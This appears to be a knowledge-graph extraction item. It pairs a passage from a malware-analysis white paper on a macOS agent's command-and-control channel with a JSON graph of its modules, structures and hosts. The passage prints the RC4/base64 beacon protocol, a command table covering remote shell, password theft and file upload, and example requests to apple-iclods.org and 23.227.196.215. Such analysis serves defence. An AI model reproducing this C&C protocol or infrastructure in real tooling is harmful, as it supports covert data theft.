@@ -1,0 +1,163 @@
+
+
+
+Sentence : D. Communication
+The agent starts by selecting a C&C server from a hardcoded list, then sends a hello message and starts two main communications
+threads:
+
+
+One for receiving commands from the C&C server, in an infinite GET loop.
+
+
+One for sending data to the C&C server, in an infinite POST loop.
+
+
+1. Receiving commands from C&C server
+The agent awaits C&C commands from the server and inserts them into a command queue that will be executed in a separate thread by
+MainHandler module.
+The command structure, called cmdPacket, contains a command identifier, a command parameter and a size for the parameter.
+struct cmdPacket {
+unsigned char cmd;
+char *param;
+unsigned long long param_size;
+};
+Command Structure
+The command request to the C&C server is made via HTTP GET. It receives a base64 encoded cmdPacket that has previously been
+encrypted with RC4 using a hardcoded KERNEL_CRYPTO_MAIN_KEY.
+|HTTP GET Request|Col2|
+|---|---|
+|Method|GET|
+|Server|C&C|
+|Verbs|search/?, fnd/?, results/?, open/?, search/?, close/?|
+|Args|from=, itwm=, ags=, oe=, aq=, btnG=, oprnd=, itwm=, utm=, channel=|
+|Response(base64)||
+Request a command from server
+[8]
+White Paper
+GET http://apple-iclods.org/close/?itwm=LO6iNPjpD0U8AVlLo_Hk3X9FSgAF&xzxI4=9_qwCS03APJT HTTP/1.1
+Host: apple -iclods.org
+Pragma: no -cache
+Connection: keep -alive
+Accept: /
+User-Agent: 4 fe4b9560e99e33dabca553e2eeee510
+CFNetwork/673.3 Darwin/13.4.0 (x86_64)
+Accept-Language: en -us
+Accept-Encoding: gzip, deflate
+Connection: keep -alive
+Example of GET message
+Based on the command from the C&C server, the agent decodes and decrypts the command structure, and inserts it in a command queue
+to be executed by the MainHandler module.
+|Command Value|Command char|Module|Action|
+|---|---|---|---|
+|101|e|InfoOS|getOsInfo|
+|102|f|InfoOS|getProcessList|
+|103|g|RemoteShell|executeShellCommand|
+|104|h|RemoteShell|getInstalledApps|
+|105|i|RemoteShell|checkBackupIosDeviceFolder|
+|106|j|FileSystem|downloadFileFromPath|
+|107|k|FileSystem|createFileInSystem|
+|108|l|FileSystem|executeFile|
+|109|m|FileSystem|deleteFile|
+|110|n|ScreenShot|takeScreenShot|
+|111|o|ScreenShot|Start screenShotLoop|
+|112|p|ScreenShot|Stop screenShotLoop|
+|116|t|Password|getFirefoxPassword|
+|117|u|FTP|uploadFile:urlServer:userName:password:|
+|118|v|FTP|stopOperation|
+|119|w|FileSystem|readFiles|
+C&C Commands and Actions
+
+Sending information to C&C server
+
+To exfiltrate information to the C&C server (such as screenshots, passwords, files and more), the agent uses a defined structure called
+msgPacket .
+struct msgPacket {
+int agent_id;
+short module_id;
+unsigned char cmd_id;
+char *data_;
+unsigned int data_size;
+unsigned char priority;
+};
+Message Structure
+[9]
+White Paper
+The message is encrypted with RC4 with a hardcoded KERNEL_CRYPTO_MAIN_KEY . It then appends a key and a DATA_TOKEN xor-ed
+with the key. Ultimately, the module encodes the result with base64 and sends it to the C&C server in a POST request.
+|HTTP POST Request|Col2|
+|---|---|
+|Method|POST|
+|Server|C&C|
+|Body(base64)||
+Send message to server
+When starting the communication, the agent sends a hello message to the server using the POST request detailed above. This request has
+the following HTTP body:
+|POST Body for Hello Message|Col2|
+|---|---|
+|agent_id|IOPlatformUUID|
+|module_id|0x3303|
+|cmd_id|2|
+|data|0x3303#3333#3344#3355#3377#|
+|data_size|0xF|
+|priority|0x16|
+Hello message body
+```
+POST http://23.227.196.215/watch/?itwm=7FJcXOPyN_Znh7quXfh4WAaKquNzY
+&oe=9cu2LRvfab&ags=Pi8KZsjwBh&oe=HXK20P&aq=h2RBWMQI&aq=yRRTH&i5H=MKNBXTB
+Host: 23.227.196.215
+Content-Type: application /x-www-form-urlencoded; charset=utf-8
+Connection: keep -alive
+Proxy-Connection: keep -alive
+Accept: /
+User-Agent: 4 fe4b9560e99e33dabca553e2eeee510 (unknown version) CFNetwork/673.3 Darwin/13.4.0 (x86_64)
+Accept-Language: en -us
+```
+Accept-Encoding: gzip, deflate
+```
+Content-Length: 81
+0_a70HpSuFQI7FnNetyKM559SUEcCj-WBinNUfTdPQw0ZVTfyNXe26b6isibFp_cJLGqtiOZ9Em3iUA==
+```
+Example of Hello Message
+[10]
+White Paper
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "C&C server", "type" : "CCSH"},
+        {"id": 2, "description": "MainHandler module", "type" : "APPS"},
+        {"id": 3, "description": "InfoOS module", "type" : "APPS"},
+        {"id": 4, "description": "RemoteShell module", "type" : "APPS"},
+        {"id": 5, "description": "FileSystem module", "type" : "APPS"},
+        {"id": 6, "description": "ScreenShot module", "type" : "APPS"},
+        {"id": 7, "description": "Password module", "type" : "APPS"},
+        {"id": 8, "description": "FTP module", "type" : "APPS"},
+        {"id": 9, "description": "HTTP GET Request", "type" : "NETP"},
+        {"id": 10, "description": "HTTP POST Request", "type" : "NETP"},
+        {"id": 11, "description": "cmdPacket structure", "type" : "TAMP"},
+        {"id": 12, "description": "msgPacket structure", "type" : "TAMP"},
+        {"id": 13, "description": "RC4 encryption algorithm", "type" : "APPS"},
+        {"id": 14, "description": "KERNEL_CRYPTO_MAIN_KEY", "type" : "TAMP"},
+        {"id": 15, "description": "DATA_TOKEN xor-ed with the key", "type" : "TAMP"},
+        {"id": 16, "description": "IOPlatformUUID", "type" : "REGI"},
+        {"id": 17, "description": "0x3303 module_id", "type" : "TAMP"},
+        {"id": 18, "description": "2 cmd_id", "type" : "TAMP"},
+        {"id": 19, "description": "Hello message body", "type" : "DOCF"},
+        {"id": 20, "description": "apple-iclods.org", "type" : "URLS"},
+        {"id": 21, "description": "23.227.196.215", "type" : "CCSH"}
+    ],
+    "edges": [
+        {"source": 1, "target": 10, "rel_name" : "receives data via"},
+        {"source": 1, "target": 9, "rel_name" : "sends commands via"},
+        {"source": 9, "target": 11, "rel_name" : "uses structure"},
+        {"source": 10, "target": 12, "rel_name" : "uses structure"},
+        {"source": 13, "target": 11, "rel_name" : "encrypts with"},
+        {"source": 13, "target": 12, "rel_name" : "encrypts with"},
+        {"source": 14, "target": 13, "rel_name" : "uses key for encryption"},
+        {"source": 15, "target": 12, "rel_name" : "appends to message"},
+        {"source": 16, "target": 19, "rel_name" : "contains in"},
+        {"source": 17, "target": 19, "rel_name" : "contains in"},
+        {"source": 18, "target": 19, "rel_name" : "contains in"},
+        {"source": 20, "target": 9, "rel_name" : "is server for"},
+        {"source": 21, "target": 10, "rel_name" : "is server for"}
+    ]
+}
